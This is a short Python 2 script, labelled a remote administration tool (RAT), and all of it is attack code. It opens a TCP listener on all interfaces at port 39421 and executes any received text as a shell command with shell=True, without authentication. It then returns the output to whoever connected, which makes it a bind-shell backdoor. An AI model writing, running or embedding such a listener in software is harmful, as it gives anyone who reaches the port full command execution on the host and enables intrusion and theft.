#remote administration tool (RAT) python
import socket
import threading

from subprocess import Popen
from subprocess import PIPE

def managment_clients(s_client):
    request = s_client.recv(1024)
    print("[*] Message received %s" % request)
    try:
        response = Popen(request, shell=True, stdout=PIPE).stdout.read()
        #Confirm message received to client
        s_client.send("ACK command %s , response %s" % (request, response))
    except Exception as e:
      print "Error in execute command %s" % str(e)
      s_client.send("NACK error: " + str(e))
    s_client.close()

ip = "0.0.0.0"
port = 39421
max_connections = 5
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((ip, port))
server.listen(max_connections)

print ("[*] Wait connections in %s:%d" % (ip, port))

while True:
    client, address = server.accept()
    print address
    #print "[*] Connection established %s:%d" % (address[0], address[2])
    managments_clients = threading.Thread(target=managment_clients, args=(client,))
    managments_clients.start()

